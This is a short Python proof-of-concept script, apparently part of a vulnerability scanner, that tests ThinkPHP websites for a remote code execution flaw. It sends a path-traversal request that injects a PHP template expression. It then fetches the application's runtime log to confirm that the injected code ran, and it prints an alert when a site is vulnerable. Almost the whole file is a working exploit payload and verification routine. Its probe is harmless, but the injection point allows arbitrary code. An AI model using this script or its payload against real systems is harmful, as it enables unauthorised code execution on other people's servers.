# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  ThinkPHP_Index_Showid_RCE_POC.py
@Desc:
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging
import datetime

def ThinkPHP_Index_Showid_RCE_POC(Url):
    scheme, url, port = umethod(Url)
    headers = {
        "User-Agent":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
    }
    try:
        payload_url = scheme + "://" + url + ":" + str(port) + "/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~print_r(md5(2333))}]"
        resp = requests.get(payload_url, headers=headers, timeout=6, verify=False)
        timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
        payload_url1 = scheme + "://" + url + ":" + str(port) +"/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log".format(timenow)
        resp2 = requests.get(payload_url1, headers=headers, timeout=6, verify=False)
        con = resp2.text
        if r"540676a129760a3" in con:
            print(Vcolors.RED +"[!] 存在ThinkPHP远程命令执行漏洞:->ThinkPHP_Index_Showid_RCE_POC\r" + Vcolors.ENDC)
    except:
        logging.error("ThinkPHP_Index_Showid_RCE_POC脚本出现异常")